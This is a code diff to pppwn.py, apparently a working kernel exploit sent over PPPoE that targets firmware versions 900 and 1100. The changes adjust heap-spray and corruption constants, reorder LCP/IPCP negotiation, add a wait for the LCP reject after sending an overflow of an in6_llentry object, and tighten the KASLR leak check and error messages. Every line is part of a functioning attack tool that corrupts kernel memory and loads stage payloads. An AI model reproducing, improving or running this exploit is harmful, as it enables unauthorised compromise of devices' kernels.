@@ -151,10 +151,10 @@ class LcpEchoHandler(AsyncSniffer):
 class Exploit():
     SPRAY_NUM = 0x1000
     PIN_NUM = 0x1000
-    CORRUPT_NUM = 0x3
+    CORRUPT_NUM = 0x1
 
-    HOLE_START = 0x800
-    HOLE_SPACE = 0x4
+    HOLE_START = 0x400
+    HOLE_SPACE = 0x10
 
     LCP_ID = 0x41
     IPCP_ID = 0x41
@@ -182,20 +182,6 @@ class Exploit():
         return self.kaslr_offset + addr
 
     def lcp_negotiation(self):
-        print('[*] Waiting for LCP configure request...')
-        while True:
-            pkt = self.s.recv()
-            if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[
-                    PPP_LCP_Configure].code == CONF_REQ:
-                break
-
-        print('[*] Sending LCP configure ACK...')
-        self.s.send(
-            Ether(src=self.source_mac,
-                  dst=self.target_mac,
-                  type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
-            PPP() / PPP_LCP(code=CONF_ACK, id=pkt[PPP_LCP_Configure].id))
-
         print('[*] Sending LCP configure request...')
         self.s.send(
             Ether(src=self.source_mac,
@@ -210,7 +196,37 @@ class Exploit():
                     PPP_LCP_Configure].code == CONF_ACK:
                 break
 
+        print('[*] Waiting for LCP configure request...')
+        while True:
+            pkt = self.s.recv()
+            if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[
+                    PPP_LCP_Configure].code == CONF_REQ:
+                break
+
+        print('[*] Sending LCP configure ACK...')
+        self.s.send(
+            Ether(src=self.source_mac,
+                  dst=self.target_mac,
+                  type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
+            PPP() / PPP_LCP(code=CONF_ACK, id=pkt[PPP_LCP_Configure].id))
+
     def ipcp_negotiation(self):
+        print('[*] Sending IPCP configure request...')
+        self.s.send(
+            Ether(
+                src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE)
+            / PPPoE(sessionid=self.SESSION_ID) / PPP() /
+            PPP_IPCP(code=CONF_REQ,
+                     id=self.IPCP_ID,
+                     options=PPP_IPCP_Option_IPAddress(data=self.SOURCE_IPV4)))
+
+        print('[*] Waiting for IPCP configure ACK...')
+        while True:
+            pkt = self.s.recv()
+            if pkt and pkt.haslayer(
+                    PPP_IPCP) and pkt[PPP_IPCP].code == CONF_ACK:
+                break
+
         print('[*] Waiting for IPCP configure request...')
         while True:
             pkt = self.s.recv()
@@ -242,22 +258,6 @@ class Exploit():
             PPP() / PPP_IPCP(code=CONF_ACK,
                              id=pkt[PPP_IPCP].id,
                              options=pkt[PPP_IPCP].options))
-
-        print('[*] Sending IPCP configure request...')
-        self.s.send(
-            Ether(
-                src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE)
-            / PPPoE(sessionid=self.SESSION_ID) / PPP() /
-            PPP_IPCP(code=CONF_REQ,
-                     id=self.IPCP_ID,
-                     options=PPP_IPCP_Option_IPAddress(data=self.SOURCE_IPV4)))
-
-        print('[*] Waiting for IPCP configure ACK...')
-        while True:
-            pkt = self.s.recv()
-            if pkt and pkt.haslayer(
-                    PPP_IPCP) and pkt[PPP_IPCP].code == CONF_ACK:
-                break
 
     def ppp_negotation(self, cb=None):
         print('[*] Waiting for PADI...')
@@ -670,12 +670,13 @@ class Exploit():
                       dst=self.target_mac,
                       type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
                 PPP(proto=0x4141))
-            sleep(0.001)
+            self.s.recv()
+            sleep(0.0005)
 
         print('[+] Pinning to CPU 0...done')
 
         # LCP fails sometimes without the wait
-        sleep(1)
+        sleep(0.5)
 
         # Corrupt in6_llentry object
         overflow_lle = self.build_overflow_lle()
@@ -691,6 +692,13 @@ class Exploit():
                                 data=(PPP_LCP_Option(data=b'A' *
                                                      (TARGET_SIZE - 4)) /
                                       PPP_LCP_Option(data=overflow_lle))))
+
+        print('[*] Waiting for LCP configure reject...')
+        while True:
+            pkt = self.s.recv()
+            if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[
+                    PPP_LCP_Configure].code == CONF_REJ:
+                break
 
         # Re-negotiate after rejection
         self.lcp_negotiation()
@@ -732,7 +740,7 @@ class Exploit():
                 ICMPv6NDOptDstLLAddr(lladdr=self.source_mac))
 
         if not corrupted:
-            print('[-] Error could not corrupt any object')
+            print('[-] Scanning for corrupted object...failed. Please retry.')
             exit(1)
 
         print(
@@ -756,7 +764,7 @@ class Exploit():
 
         if (self.pppoe_softc_list & 0xffffffff00000fff
                 != self.offs.PPPOE_SOFTC_LIST & 0xffffffff00000fff):
-            print('[-] Error leak is invalid.')
+            print('[-] Error leak is invalid. Wrong firmware?')
             exit(1)
 
         print('')
@@ -811,7 +819,7 @@ class Exploit():
 
 def main():
     parser = ArgumentParser('pppwn.py')
-    parser.add_argument('--interface')
+    parser.add_argument('--interface', required=True)
     parser.add_argument('--fw', choices=['900', '1100'], default='1100')
     parser.add_argument('--stage1', default='stage1/stage1.bin')
     parser.add_argument('--stage2', default='stage2/stage2.bin')
